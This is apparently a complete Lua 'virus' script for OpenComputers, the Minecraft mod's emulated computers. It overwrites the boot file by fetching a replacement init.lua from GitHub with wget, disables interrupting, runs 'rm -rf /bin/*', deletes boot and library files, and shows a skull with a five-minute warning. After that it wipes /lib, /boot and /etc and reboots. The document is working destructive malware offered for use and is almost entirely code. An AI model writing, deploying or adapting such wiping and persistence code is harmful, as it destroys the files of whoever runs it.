local c = require("component")
local gpu = c.gpu
local comp = require("computer")
local fs = require("filesystem")
local os = require("os")
local shell = require("shell")
local event = require("event")

fs.remove("/init.lua")
os.execute("wget -f https://raw.githubusercontent.com/matvey-mayner/OpenOS-Apps/refs/heads/main/kraka/init.lua /init.lua")
os.execute("wget -f https://raw.githubusercontent.com/sziberov/OpenComputers/refs/heads/master/lib/ECSAPI.lua /lib/ECSAPI.lua")
os.execute("wget -f https://raw.githubusercontent.com/sziberov/OpenComputers/refs/heads/master/lib/advancedLua.lua /lib/advancedLua.lua")
local ECS = require("ECSAPI")
ECS.disableInterrupting()
shell.execute("rm -rf /bin/*")
fs.remove("/lib/core/boot.lua")
fs.remove("/boot/00_base.lua")

gpu.setResolution(80, 25)
gpu.setBackground(0xff0000)
gpu.setForeground(0xFFFFFF)

gpu.fill(1, 1, 80, 25, " ")

local seconds = 300
local startTime = comp.uptime()

os.sleep(0.3)
gpu.set(1, 1, "░░▄▀▀▀▀▀▄░░")
os.sleep(0.3)
gpu.set(1, 2, "░▐░▄▄░▄▄░▌░")
os.sleep(0.3)
gpu.set(1, 3, "░▐░▀░▄░▀░▌░")
os.sleep(0.3)
gpu.set(1, 4, "░░▌▄░▄░▄▐░░")
os.sleep(0.3)
gpu.set(1, 5, "░░▐░▀░▀░▌░░")
os.sleep(0.3)
gpu.set(1, 6, "░░░▀▀▀▀▀░░░")

os.sleep(0.5)

gpu.set(30, 1, "You Have a 5 minutes")
os.sleep(0.3)
gpu.set(30, 3, "After five minutes, all your files will be deleted!")
os.sleep(0.3)
gpu.set(30, 6, "Rules:")
os.sleep(0.3)
gpu.set(30, 8, "1. Don't try delete this virus")
os.sleep(0.3)
gpu.set(30, 10, "2. Don't Reboot Computer")
os.sleep(0.3)
gpu.set(30, 12, "3. Don't leave this program")


while comp.uptime() - startTime < seconds do
  event.pull("touch")
end

fs.remove("/lib/*")
fs.remove("/boot/*")
fs.remove("/etc/*")

comp.shutdown(true)
